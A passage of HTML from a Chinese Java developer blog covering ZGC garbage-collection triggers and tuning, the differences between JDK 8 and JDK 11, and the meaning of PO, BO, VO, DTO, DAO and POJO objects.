    <td>-XX:ParallelGCThreads</td>
    <td>-XX:ZUncommit</td>
    <td>-XX:ZVerifyViews</td>
   </tr>
   <tr>
    <td>-XX:UseDynamicNumberOfGCThreads</td>
    <td>-XX:ZUncommitDelay</td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseLargePages</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseTransparentHugePages</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:UseNUMA</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:SoftRefLRUPolicyMSPerMB</td>
    <td></td>
    <td></td>
   </tr>
   <tr>
    <td>-XX:AllocateHeapAt</td>
    <td></td>
    <td></td>
   </tr>
  </tbody>
 </table> 
 <h3><a id="ZGC_366"></a>ZGC的垃圾回收什么情况下会被触发？</h3> 
 <p>ZGC中目前会有四种机制导致GC被触发：</p> 
 <ul>
  <li>①定时触发，默认为不使用，可通过ZCollectionInterval参数配置。</li>
  <li>②预热触发，最多三次，在堆内存达到10%、20%、30%时触发，主要时统计GC时间，为其他GC机制使用。</li>
  <li>③分配速率，基于正态分布统计，计算内存99.9%可能的最大分配速率，以及此速率下内存将要耗尽的时间点，在耗尽之前触发GC「耗尽时间 - 一次GC最大持续时间 - 一次GC检测周期时间」。</li>
  <li>④主动触发，默认开启，可通过ZProactive参数配置，距上次GC堆内存增长10%，或超过5分钟时，对比「距上次GC的间隔时间」和「49*一次GC的最大持续时间」，超过则触发。</li>
 </ul> 
 <h2><a id="ZGC_373"></a>ZGC调优</h2> 
 <p>ZGC 相当智能，我们需要调整的参数很少，由于 ZGC 已经自动将垃圾回收时间控制在 10ms 左右，我们主要关心的是垃圾回收的次数和避免并发回收失败导致的长停顿。</p> 
 <p>ZGC的核心特点是并发，GC过程中一直有新的对象产生。如何保证在GC完成之前，新产生的对象不会将堆占满，是ZGC参数调优的第一大目标。因为在ZGC中，当垃圾来不及回收将堆占满时，会导致正在运行的线程停顿，持续时间可能长达秒级之久。</p> 
 <p>ZGC有多种GC触发机制</p> 
 <ul>
  <li> <p>阻塞内存分配请求触发：<br> 当垃圾来不及回收，垃圾将堆占满时，会导致部分线程阻塞。日志中关键字是“Allocation Stall”。</p> </li>
  <li> <p>基于分配速率的自适应算法：<br> 最主要的 GC 触发方式，其算法原理可简单描述为” ZGC 根据近期的对象分配速率以及 GC 时间，计算出当内存占用达到什么阈值时触发下一次 GC ”。日志中关键字是“Allocation Rate”。</p> </li>
  <li> <p>基于固定时间间隔：<br> 通过ZCollectionInterval控制，适合应对突增流量场景。流量平稳变化时，自适应算法可能在堆使用率达到95%以上才触发GC。流量突增时，自适应算法触发的时机可能会过晚，导致部分线程阻塞。我们通过调整此参数解决流量突增场景的问题，比如定时活动、秒杀等场景。日志中关键字是“Timer”。</p> </li>
  <li> <p>主动触发规则：<br> 类似于固定间隔规则，但时间间隔不固定，是 ZGC 自行算出来的时机。日志中关键字是“Proactive”。其中，最主要使用的是 Allacation Stall GC 和 Allocation Rate GC。我们的调优思路为尽量不出现 Allocation Stall GC , 然后 Allocation Rate GC 尽量少。为了做到不出现 Allocation Stall GC ，我们需要做到垃圾尽量提前回收，不要让堆被占满，所以我们需要在堆内存占满前进行 Allocation Rate GC 。为了 Allocation Rate GC 尽量少，我们需要提高堆的利用率，尽量在堆占用 80% 以上进行 Allocation Rate GC 。基于此，Oracle 官方 ZGC 调优指南只建议我们调整两个参数：</p> </li>
  <li> <p>预热规则：<br> 服务刚启动时出现，一般不需要关注。日志中关键字是“Warmup”。</p> </li>
  <li> <p>外部触发：<br> 代码中显式调用System.gc()触发。 日志中关键字是“System.gc()”。</p> </li>
  <li> <p>元数据分配触发：<br> 元数据区不足时导致，一般不需要关注。 日志中关键字是“Metadata GC Threshold”。</p> </li>
 </ul> 
 <h1><a id="_398"></a>参考</h1> 
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45101064/article/details/123478022">JVM成神路之GC分区篇：G1、ZGC、ShenandoahGC高性能收集器深入剖析</a></p> 
 <p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7215485778029609018#heading-29">ZGC在去哪儿机票运价系统实践</a></p> 
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T08:40:25.000Z" title="2023/4/27 16:40:25">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T08:26:14.439Z" title="2023/4/27 16:26:14">2023-04-27</time>更新</span><span class="level-item">24 分钟读完 (大约3572个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Java%E5%85%AB%E8%82%A1%E6%96%87%E3%80%91JDK8%E4%B8%8EJDK11%E7%9A%84%E5%8C%BA%E5%88%AB/">【Java八股文】JDK8与JDK11的区别</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="java八股文jdk8与jdk11的区别"><a class="markdownIt-Anchor" href="#java八股文jdk8与jdk11的区别">#</a> 【Java 八股文】JDK8 与 JDK11 的区别</h1>
<h3 id="文章目录"><a class="markdownIt-Anchor" href="#文章目录">#</a> 文章目录</h3>
<ul>
<li><a href="#_5">前言</a></li>
<li><a href="#Java8_11">一、Java8 的新特性</a></li>
<li>
<ul>
<li>
<ul>
<li><a href="#Lambda__12">Lambda 表达式</a></li>
<li><a href="#_14">方法引用</a></li>
<li><a href="#_16">函数式接口实例</a></li>
<li><a href="#Java_8__18">Java 8 默认方法</a></li>
<li><a href="#Stream_20">Stream</a></li>
<li><a href="#Optional__22">Optional 类</a></li>
<li><a href="#Nashorn_JavaScript_24">Nashorn JavaScript</a></li>
<li><a href="#_API_26">日期时间 API</a></li>
<li><a href="#Base64_36">Base64</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Java11_46">二、Java11 的新特性</a></li>
<li>
<ul>
<li>
<ul>
<li><a href="#ZGC_48">ZGC</a></li>
<li><a href="#Flight_RecorderJFR_50">Flight Recorder（JFR）</a></li>
<li><a href="#LowOverhead_Heap_Profiling_53">Low-Overhead Heap Profiling</a></li>
<li><a href="#HTTP2_Client_API_55">HTTP/2 Client API</a></li>
<li><a href="#Transport_Layer_Security_TLS_13_57">Transport Layer Security (TLS) 1.3</a></li>
<li><a href="#Improve_Aarch64_Intrinsics_61">Improve Aarch64 Intrinsics</a></li>
<li><a href="#Epsilon_A_NoOp_Garbage_CollectorExperimental_63">Epsilon: A No-Op Garbage Collector(Experimental)</a></li>
<li><a href="#Launch_SingleFile_SourceCode_Programs_65">Launch Single-File Source-Code Programs</a></li>
<li><a href="#Unicode_10_67">Unicode 10</a></li>
<li><a href="#NestBased_Access_Control_69">Nest-Based Access Control</a></li>
<li><a href="#Dynamic_ClassFile_Constants_71">Dynamic Class-File Constants</a></li>
<li><a href="#Remove_the_Java_EE_and_CORBA_Modules_73">Remove the Java EE and CORBA Modules</a></li>
<li><a href="#Deprecate_the_Nashorn_JavaScript_Engine_75">Deprecate the Nashorn JavaScript Engine</a></li>
<li><a href="#Deprecate_the_Pack200_Tools_and_API_77">Deprecate the Pack200 Tools and API</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_80">总结</a></li>
</ul>
<hr>
<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1>
<p>目前市场上主流的稳定版主要是 Java 8 和 Java 11。</p>
<hr>
<h1 id="一-java8的新特性"><a class="markdownIt-Anchor" href="#一-java8的新特性">#</a> 一、Java8 的新特性</h1>
<h3 id="lambda"><a class="markdownIt-Anchor" href="#lambda">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Lambda&amp;spm=1001.2101.3001.7020">Lambda</a> 表达式</h3>
<p>Lambda 表达式，也可称为闭包，它是推动 Java 8 发布的最重要新特性，Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中），使用 Lambda 表达式可以使代码变的更加简洁紧凑。</p>
<h3 id="方法引用"><a class="markdownIt-Anchor" href="#方法引用">#</a> 方法引用</h3>
<p>方法引用通过方法的名字来指向一个方法，方法引用可以使语言的构造更紧凑简洁，减少冗余代码，方法引用使用一对冒号 :: 。</p>
<h3 id="函数式接口"><a class="markdownIt-Anchor" href="#函数式接口">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3&amp;spm=1001.2101.3001.7020">函数式接口</a>实例</h3>
<p>Predicate 接口是一个函数式接口，它接受一个输入参数 T，返回一个布尔值结果。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）。该接口用于测试对象是 true 或 false。</p>
<h3 id="java-8-默认方法"><a class="markdownIt-Anchor" href="#java-8-默认方法">#</a> Java 8 默认方法</h3>
<p>Java 8 新增了接口的默认方法。简单说，默认方法就是接口可以有实现方法，而且不需要实现类去实现其方法。我们只需在方法名前面加个 default 关键字即可实现默认方法。</p>
<h3 id="stream"><a class="markdownIt-Anchor" href="#stream">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Stream&amp;spm=1001.2101.3001.7020">Stream</a></h3>
<p>Stream 使用一种类似用 SQL 语句从数据库查询数据的直观方式来提供一种对 Java 集合运算和表达的高阶抽象。Stream API 可以极大提高 Java 程序员的生产力，让程序员写出高效率、干净、简洁的代码。这种风格将要处理的元素集合看作一种流，流在管道中传输，并且可以在管道的节点上进行处理，比如筛选，排序，聚合等。元素流在管道中经过中间操作（intermediate operation）的处理，最后由最终操作 (terminal operation) 得到前面处理的结果。</p>
<h3 id="optional-类"><a class="markdownIt-Anchor" href="#optional-类">#</a> Optional 类</h3>
<p>Optional 类是一个可以为 null 的容器对象。如果值存在则 isPresent () 方法会返回 true，调用 get () 方法会返回该对象。Optional 是个容器：它可以保存类型 T 的值，或者仅仅保存 null。Optional 提供很多有用的方法，这样我们就不用显式进行空值检测。Optional 类的引入很好的解决空指针异常。</p>
<h3 id="nashorn-javascript"><a class="markdownIt-Anchor" href="#nashorn-javascript">#</a> Nashorn JavaScript</h3>
<p>Nashorn 一个 javascript 引擎。从 JDK1.8 开始，Nashorn 取代 Rhino (JDK 1.6, JDK1.7) 成为 Java 的嵌入式 JavaScript 引擎。Nashorn 完全支持 ECMAScript 5.1 规范以及一些扩展。它使用基于 JSR292 的新语言特性，其中包含在 JDK 7 中引入的 invokedynamic，将 JavaScript 编译成 Java 字节码。与先前的 Rhino 实现相比，这带来了 2 到 10 倍的性能提升。</p>
<h3 id="日期时间-api"><a class="markdownIt-Anchor" href="#日期时间-api">#</a> 日期时间 API</h3>
<p>Java 8 通过发布新的 Date-Time API (JSR 310) 来进一步加强对日期与时间的处理。<br>
在旧版的 Java 中，日期时间 API 存在诸多问题，其中有：</p>
<ol>
<li>非线程安全 − java.util.Date 是非线程安全的，所有的日期类都是可变的，这是 Java 日期类最大的问题之一。</li>
<li>设计很差 − Java 的日期 / 时间类的定义并不一致，在 java.util 和 java.sql 的包中都有日期类，此外用于格式化和解析的类在 java.text 包中定义。java.util.Date 同时包含日期和时间，而 java.sql.Date 仅包含日期，将其纳入 java.sql 包并不合理。另外这两个类都有相同的名字，这本身就是一个非常糟糕的设计。</li>
<li>时区处理麻烦 − 日期类并不提供国际化，没有时区支持，因此 Java 引入了 java.util.Calendar 和 java.util.TimeZone 类，但他们同样存在上述所有的问题。<br>
Java 8 在 java.time 包下提供了很多新的 API。以下为两个比较重要的 API：</li>
<li>Local (本地) − 简化了日期时间的处理，没有时区的问题。</li>
<li>Zoned (时区) − 通过制定的时区处理日期时间。<br>
新的 java.time 包涵盖了所有处理日期，时间，日期 / 时间，时区，时刻（instants），过程（during）与时钟（clock）的操作。</li>
</ol>
<h3 id="base64"><a class="markdownIt-Anchor" href="#base64">#</a> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Base64&amp;spm=1001.2101.3001.7020">Base64</a></h3>
<p>在 Java8 中，Base64 编码已经成为 Java 类库的标准。<br>
Java 8 内置了 Base64 编码的编码器和解码器。<br>
Base64 工具类提供了一套静态方法获取下面三种 BASE64 编解码器：</p>
<ol>
<li>基本：输出被映射到一组字符 A-Za-z0-9+/，编码不添加任何行标，输出的解码仅支持 A-Za-z0-9+/。</li>
<li>URL：输出映射到一组字符 A-Za-z0-9+_，输出是 URL 和文件。</li>
<li>MIME：输出隐射到 MIME 友好格式。输出每行不超过 76 字符，并且使用’\r’并跟随’\n’作为分割。编码输出最后没有行分割。</li>
</ol>
<h1 id="二-java11的新特性"><a class="markdownIt-Anchor" href="#二-java11的新特性">#</a> 二、Java11 的新特性</h1>
<h3 id="zgc"><a class="markdownIt-Anchor" href="#zgc">#</a> ZGC</h3>
<p>JDK11 引入了两种新的 GC，其中包括也许是划时代意义的 ZGC，虽然其目前还是实验特性，但是从能力上来看，这是 JDK 的一个巨大突破，为特定生产环境的苛刻需求提供了一个可能的选择。例如，对部分企业核心存储等产品，如果能够保证不超过 10ms 的 GC 暂停，可靠性会上一个大的台阶，这是过去我们进行 GC 调优几乎做不到的，是能与不能的问题。对于 G1 GC，相比于 JDK 8，升级到 JDK 11 即可享受到：并行的 Full GC，快速的 CardTable 扫描，自适应的堆占用比例调整（IHOP），在并发标记阶段的类型卸载等等。这些都是针对 G1 的不断增强，其中串行 Full GC 等甚至是曾经被广泛诟病的短板，你会发现 GC 配置和调优在 JDK11 中越来越方便。</p>
<h3 id="flight-recorderjfr"><a class="markdownIt-Anchor" href="#flight-recorderjfr">#</a> Flight Recorder（JFR）</h3>
<p>Flight Recorder（JFR）是 Oracle 刚刚开源的强大特性。JFR 是一套集成进入 JDK、JVM 内部的事件机制框架，通过良好架构和设计的框架，硬件层面的极致优化，生产环境的广泛验证，它可以做到极致的可靠和低开销。在 SPECjbb2015 等基准测试中，JFR 的性能开销最大不超过 1%，所以，工程师可以基本没有心理负担地在大规模分布式的生产系统使用，这意味着，我们既可以随时主动开启 JFR 进行特定诊断，也可以让系统长期运行 JFR，用以在复杂环境中进行 “After-the-fact” 分析。<br>
在保证低开销的基础上，JFR 提供的能力可以应用在对锁竞争、阻塞、延迟，JVM GC、SafePoint 等领域，进行非常细粒度分析。甚至深入 JIT Compiler 内部，全面把握热点方法、内联、逆优化等等。JFR 提供了标准的 Java、C++ 等扩展 API，可以与各种层面的应用进行定制、集成，为复杂的企业应用栈或者复杂的分布式应用，提供 All-in-One 解决方案。而这一切都是内建在 JDK 和 JVM 内部的，并不需要额外的依赖，开箱即用。</p>
<h3 id="low-overhead-heap-profiling"><a class="markdownIt-Anchor" href="#low-overhead-heap-profiling">#</a> Low-Overhead Heap Profiling</h3>
<p>它来源于 Google 等业界前沿厂商的一线实践，通过获取对象分配细节，为 JDK 补足了对象分配诊断方面的一些短板，工程师可以通过 JVMTI 使用这个能力增强自身的工具。</p>
<h3 id="http2-client-api"><a class="markdownIt-Anchor" href="#http2-client-api">#</a> HTTP/2 Client API</h3>
<p>新的 HTTP API 提供了对 HTTP/2 等业界前沿标准的支持，精简而又友好的 API 接口，与主流开源 API（如，Apache HttpClient， Jetty， OkHttp 等）对等甚至更高的性能。与此同时它是 JDK 在 Reactive-Stream 方面的第一个生产实践，广泛使用了 Java Flow API 等，终于让 Java 标准 HTTP 类库在扩展能力等方面，满足了现代互联网的需求。</p>
<h3 id="transport-layer-security-tls-13"><a class="markdownIt-Anchor" href="#transport-layer-security-tls-13">#</a> Transport <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Layer&amp;spm=1001.2101.3001.7020">Layer</a> Security (TLS) 1.3</h3>
<p>就是安全类库、标准等方面的大范围升级，它还是中国安全专家范学雷所领导的 JDK 项目，完全不同于以往的修修补补，是个非常大规模的工程。<br>
Dynamic Class-File Constants<br>
 动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。</p>
<h3 id="improve-aarch64-intrinsics"><a class="markdownIt-Anchor" href="#improve-aarch64-intrinsics">#</a> Improve Aarch64 Intrinsics</h3>
<p>主要是针对 ARM Aarch64 架构的优化，比如提供优化的 sin、cos 等函数。</p>
<h3 id="epsilon-a-no-op-garbage-collectorexperimental"><a class="markdownIt-Anchor" href="#epsilon-a-no-op-garbage-collectorexperimental">#</a> Epsilon: A No-Op Garbage Collector(Experimental)</h3>
<p>无操作的垃圾收集器。Epsilon 是一个特殊的垃圾收集器，只处理内存分配，不负责回收。一旦堆耗尽，就关闭 JVM。听上去这个收集器好像没什么意义。不过它还是有不少用处的。比如：性能测试。GC 会影响性能，有了这么一个几乎什么都不干的 GC，我们可以过滤掉 GC 带来的影响因素。还有些性能因素不是 GC 引入的，比如编译器变换，利用 Epsilon GC，我们可以对比。就像生物学里做实验，我们可以用它做一个对照组。另外还有内存压力测试、VM 接口测试等。</p>
<h3 id="launch-single-file-source-code-programs"><a class="markdownIt-Anchor" href="#launch-single-file-source-code-programs">#</a> Launch Single-File Source-Code Programs</h3>
<p>支持运行单个文件中的源代码。在刚学习 Java 或者编写小的工具程序时，我们一般要先用 javac 编译源文件，再用 java 命令运行。有了这个功能，我们可以直接用 java 命令运行源程序。</p>
<h3 id="unicode-10"><a class="markdownIt-Anchor" href="#unicode-10">#</a> Unicode 10</h3>
<p>升级现有 API 支持 Unicode 10。Java SE 10 实现的是 Unicode 8.0。与 Java 10 相比，Java 11 多支持 16 018 个新字符，10 种新的文字类型。</p>
<h3 id="nest-based-access-control"><a class="markdownIt-Anchor" href="#nest-based-access-control">#</a> Nest-Based Access Control</h3>
<p>基于嵌套的访问控制。Java 11 引入了 nest 的概念，这是一个新的访问控制上下文（context），逻辑上处于同一代码实体中的类，尽管会被编译为不同的 class 文件，但是可以访问彼此的 private 成员，不再需要编译器插入辅助访问的桥方法。</p>
<h3 id="dynamic-class-file-constants"><a class="markdownIt-Anchor" href="#dynamic-class-file-constants">#</a> Dynamic Class-File Constants</h3>
<p>动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。</p>
<h3 id="remove-the-java-ee-and-corba-modules"><a class="markdownIt-Anchor" href="#remove-the-java-ee-and-corba-modules">#</a> Remove the Java EE and CORBA Modules</h3>
<p>将 Java SE 9 中标记为废弃的 Java EE 和 CORBA 正式从 Java SE 平台中删除。</p>
<h3 id="deprecate-the-nashorn-javascript-engine"><a class="markdownIt-Anchor" href="#deprecate-the-nashorn-javascript-engine">#</a> Deprecate the Nashorn JavaScript Engine</h3>
<p>废弃 Nashorn JavaScript 脚本引擎、API 和 jjs 工具。Nashorn 是在 JDK 8 中引入的，当时完整实现了 ECMAScript-262 5.1。不过随着 ECMAScript 的演进加快，Nashorn 维护越来越困难。</p>
<h3 id="deprecate-the-pack200-tools-and-api"><a class="markdownIt-Anchor" href="#deprecate-the-pack200-tools-and-api">#</a> Deprecate the Pack200 Tools and API</h3>
<p>废弃了 pack200 和 unpack200 工具，以及 java.util.jar 包中的 Pack200 API。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h1>
<ol>
<li>G1 GC 平均速度通过 Java 8 切换到 Java 11 就有 16％ 的改进，但是大部分项目都用不到，一些高实时性的游戏可以用；</li>
<li>Java 11 支持源文件直接运行；</li>
<li>已完成项目不建议升级 jdk11，或者新项目需要依赖现有代码，不建议升级 jdk11，因为升级版本涉及到大量的旧代码移植，代码重写，架构重构，全量测试；</li>
<li>如果 jdk8 满足开发需求，并且需依赖现有以 JDK8 开发的代码，建议还是以 jdk8 进行开发，否则如果选用 jdk11 可能面临旧代码重写，架构重构，以及一些不知道的隐形依赖；</li>
<li>系统追求的是稳定并非技术，jdk8 已被广泛验证非常稳定，而且目前主流开发版本确实也是 8，技术还是要服务于业务，稳定大于一切；</li>
<li>从 jdk8 往上升级会出现一些 jar 依赖的改变，模块化带来的反射问题，classload 的变化导致某些问题；</li>
<li>Spring，Spring Boot，Spring Cloud，Dubbo，Guava，Jackson，Tomcat，JUnit 等等项目都适配了 JDK11，并且经历了生产环境的检验，才可以考虑是否将 JDK8 换成 JDK11；</li>
<li>8 之后，商用收费</li>
</ol>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-26T08:51:33.000Z" title="2023/4/26 16:51:33">2023-04-26</time>发表</span><span class="level-item"><time dateTime="2023-04-26T04:59:14.155Z" title="2023/4/26 12:59:14">2023-04-26</time>更新</span><span class="level-item">12 分钟读完 (大约1726个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/26/%E3%80%90Java%E3%80%91%E5%85%B3%E4%BA%8EPO%E3%80%81BO%E3%80%81VO%E3%80%81DTO%E3%80%81DAO%E3%80%81POJO%E7%AD%89%E6%A6%82%E5%BF%B5%E7%9A%84%E7%90%86%E8%A7%A3/">【Java】关于PO、BO、VO、DTO、DAO、POJO等概念的理解</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="java关于po-bo-vo-dto-dao-pojo等概念的理解"><a class="markdownIt-Anchor" href="#java关于po-bo-vo-dto-dao-pojo等概念的理解">#</a> 【Java】关于 PO、BO、VO、DTO、DAO、POJO 等概念的理解</h1>
<h2 id="popersistant-object持久对象"><a class="markdownIt-Anchor" href="#popersistant-object持久对象">#</a> PO（Persistant Object）持久对象</h2>
<p>PO 是持久化对象，用于表示数据库中的一条记录映射成的 Java 对象，类中应该都是基本数据类型和 String，而不是更复杂的类型，因为要和数据库表字段对应。PO 仅仅用于表示数据，不对数据进行操作，拥有 get 和 set 方法。对象类中的属性对应数据库表中的字段，有多少个字段就有多少个属性，完全匹配。遵循 JavaBean 规范，拥有 get 和 set 方法。如下图所示：</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725154038992.png" alt="img"></p>
<h2 id="dodata-object数据对象"><a class="markdownIt-Anchor" href="#dodata-object数据对象">#</a> DO（Data Object）数据对象</h2>
<p>数据对象，与数据库表结构一一对应，通过 dao 层向上传输数据对象，属性和 PO 中的基本一致。</p>
<h2 id="aoapplication-object应用对象"><a class="markdownIt-Anchor" href="#aoapplication-object应用对象">#</a> AO（Application Object）应用对象</h2>
<p>在 Web 层与 Service 层之间抽象的复用对象模型，极为贴近展示层，复用度不高。</p>
<h2 id="bobusiness-object业务对象"><a class="markdownIt-Anchor" href="#bobusiness-object业务对象">#</a> BO（Business Object）业务对象</h2>
<p>BO 是实际的业务对象，会参与业务逻辑的处理操作，里面可能会包含多个类，用于表示一个业务对象。例如用户可以拥有宠物，在这里把用户对应一个 PO、宠物对应一个 PO，那么建立一个对应的 BO 对象来处理用户和宠物的关系，每个 BO 都包含用户 PO 和宠物 PO，而处理逻辑时针对 BO 去处理。遵循 JavaBean 规范，拥有 get 和 set 方法。例如：（注：User 和 Pet 都是 PO 对象，但会放进 BO 中，形成一个复杂的业务对象。）</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725155328378.png" alt="img"></p>
<p>但注意，BO 又包括了业务逻辑，通常在 service 层，封装了对 DAO 层的调用，可以进行 PO 与 VO/DTO 之间的转换。</p>
<h2 id="vovalue-object表现对象"><a class="markdownIt-Anchor" href="#vovalue-object表现对象">#</a> VO（Value Object）表现对象</h2>
<p>VO 对象主要用于前端界面显示的数据，是与前端进行交互的 Java 对象，但这里是不用 PO 传递数据的，因为 PO 包括数据库表中的所有字段，对于前端来说我们只需要显示一部分字段就可以了，例如我们的用户表 user 中的 password（密码）字段、phone（电话）字段、insert_time（插入时间）字段是没有必要也不能显示在前端界面的。遵循 JavaBean 规范，拥有 get 和 set 方法。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725155929945.png" alt="img"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725160415980.png" alt="img"></p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/20210725160406410.png" alt="img"></p>
<h2 id="dtodata-transfer-object数据传输对象"><a class="markdownIt-Anchor" href="#dtodata-transfer-object数据传输对象">#</a> DTO（Data Transfer Object）数据传输对象</h2>
<p>数据传输对象是在传递给前端时使用的，如一张表有 100 个字段，那么对应的 PO 就有 100 个属性，但是我们的前端界面只需要显示 10 个字段，所以我们没必要把所有字段的 PO 对象传递到客户端，我们只需要把只有这 10 个属性的 DTO 对象传递到客户端，不会暴露服务端的表结构，到达客户端后，如果这个对象用于界面表示，那么它的身份就是 VO 对象。</p>
<p>DTO 和 VO 概念相似，通常情况下字段也基本一致。但有所不同，DTO 表示一个数据传输对象，是在服务端用于不同服务或不同层之间的数据传输，例如 dao 层到 service 层，service 层到 web 层；而 VO 是在客户端浏览器显示的表现对象，用于在浏览器界面数据的显示。</p>
<h2 id="daodata-access-object数据访问对象"><a class="markdownIt-Anchor" href="#daodata-access-object数据访问对象">#</a> DAO（Data Access Object）数据访问对象</h2>
<p>DAO 是主要封装对数据库的访问，例如 UserDao 封装的就是对 user 表的增删改查操作。</p>
<p>通过它可以把 POJO 持久化为 PO，用 PO 组装出 VO 和 DTO。</p>
<p>DAO 一般在持久层，完全封装数据库操作，对外暴露的方法的使得上层不需要关注数据库的相关信息，只需要插入、删除、更新、查询即可。</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/2021072516452423.png" alt="img"></p>
<h2 id="pojoplain-ordinary-java-object简单java对象"><a class="markdownIt-Anchor" href="#pojoplain-ordinary-java-object简单java对象">#</a> POJO（Plain Ordinary Java Object）简单 Java 对象</h2>
<p>表示一个个简单的 Java 对象，而 PO、VO、DTO 都是典型的 POJO，而 DAO 和 BO 一般不是 POJO，只是提供了一些调用方法。</p>
<p>POJO 是 DO、DTO、BO、VO 的统称。</p>
<h2 id="实例"><a class="markdownIt-Anchor" href="#实例">#</a> 实例</h2>
<p>有一个博客系统，数据库中存储了很多篇博客。我们会做如下设计：</p>
<ul>
<li>数据库表：表中的博客包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。</li>
<li>PO：包括编号、博客标题、博客内容、博客标签、博客分类、博客状态、创建时间、修改时间等。（与数据库表中的字段一样。）</li>
<li>VO：在客户端浏览器展示的页面数据，博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客 URL、下一篇博客 URL。</li>
<li>DTO：在服务端数据传输的对象，编号、博客标题、博客内容、博客标签、博客分类、创建时间、上一篇博客编号、下一篇博客编号。</li>
<li>DAO：数据库增删改查的方法，例如新增博客、删除博客、查询所有博客、更新博客。</li>
<li>BO：基本业务操作，如管理分类、管理标签、修改博客状态等，是我们常说的 service 层操作。</li>
</ul>
<p>参考链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/uestcyms/article/details/80244407">Java 中常见的对象类型简述 (DO、BO、DTO、VO、AO、PO)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/39651928">PO BO VO DTO POJO DAO DO 这些 Java 中的概念分别指一些什么？</a></li>
</ul>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
